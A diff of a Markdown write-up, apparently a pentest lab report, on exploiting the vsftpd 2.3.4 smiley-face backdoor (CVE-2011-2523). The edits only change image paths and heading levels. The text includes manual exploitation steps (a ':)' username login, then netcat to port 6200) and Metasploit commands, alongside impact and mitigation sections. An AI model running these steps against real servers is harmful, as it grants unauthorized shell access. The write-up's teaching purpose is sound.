@@ -26,11 +26,11 @@
 - SearchSploit is a command-line search tool for Exploit-DB that allows you to take a copy of the Exploit Database with you.
 - `searchsploit vsftpd 2.3.4`
 	
-	![searchsploit results](../images/vsftpd_2.3.4.jpeg)
+	![searchsploit results](../../images/vsftpd_2.3.4.jpeg)
 
 - SearchSploit reveals that there is `Backdoor Command Execution` vulnerability present in vsftpd 2.3.4 version of FTP.
 
-## vsftpd 2.3.4 - Backdoor Command Execution - Smiley [:)] Face backdoor (CVE: 2011-2523)
+### vsftpd 2.3.4 - Backdoor Command Execution - Smiley [:)] Face backdoor (CVE: 2011-2523)
 
 - The version of vsftpd running on the remote host has been compiled with a backdoor. Attempting to login with a `username containing :)` (a smiley face) triggers the backdoor, which results in a shell listening on TCP `port 6200`. The shell stops listening after a client connects to and disconnects from it. [ Source: https://www.tenable.com/plugins/nessus/55523]
 - The source code of this version of vsftpd was modified either through access of distributing website or the distributing server.
@@ -43,13 +43,13 @@
 
 ![backdoor code](https://static.packt-cdn.com/products/9781786463166/graphics/image_01_018.jpg)
 
-### Impact Analysis
+#### Impact Analysis
 
 - Since this vulnerability starts a backdoor, it gives Remote Code Execution [RCE] and full access of the system as the user that was used to configure the vsftpd service on the system.
 - The attacker can easily pretend to be the original user and modify/harm the system files.
 - Therefore, the impact level of this vulnerability is very high.
 
-### Proof of Concept
+#### Proof of Concept
 
 - This vulnerability can be exploited either through Metasploit or manually through an automated script or command line.
 
@@ -60,13 +60,13 @@
 		- `PASS any_password` # password doesn't matter
 		- This should've opened port `6200` on the host machine that runs the backdoor.
 
-		![backdoor command injection](../images/backdoor_command_inject_vsftpd_1.jpeg)
+		![backdoor command injection](../../images/backdoor_command_inject_vsftpd_1.jpeg)
 
 	- Use telent or netcat to connect on `6200` port backdoor:
 		- `nc 172.16.242.129 6200`
 		- `id` # verify Connection
 
-		![backdoor command injection](../images/backdoor_command_inject_vsftpd_2.jpeg)
+		![backdoor command injection](../../images/backdoor_command_inject_vsftpd_2.jpeg)
 
 - Automated Script Exploitation:
 	- Script can be downloaded from exploit-db [https://www.exploit-db.com/exploits/49757] or copied from searchsploit tool.
@@ -79,22 +79,22 @@
 	- We can see what all parameters we need to set in order to exploit the machine using:
 		- `show options` 
 
-		![backdoor command injection](../images/backdoor_command_inject_vsftpd_msf_1.jpeg)
+		![backdoor command injection](../../images/backdoor_command_inject_vsftpd_msf_1.jpeg)
 
 	- Set target(s) (RHOSTS):
 		- `set RHOSTS <IP_ADDRESS>`
 	- Execute the attack using run or exploit command:
 		- `exploit`
 
-		![backdoor command injection](../images/backdoor_command_inject_vsftpd_msf_2.jpeg)
+		![backdoor command injection](../../images/backdoor_command_inject_vsftpd_msf_2.jpeg)
 
 
-### Patches and Updates:
+#### Patches and Updates:
 
 - The developers of vsftpd responded to this vulnerability and released newer versions of the software with security patches and fixes.
 - All users were advised to update to the latest version as soon as possible to protect their servers from exploitation.
 
-### Mitigation
+#### Mitigation
 
 - Software Integrity and Authenticity Checks using CheckSums and digital signatures.
 - Regular updates and stronger credentials.
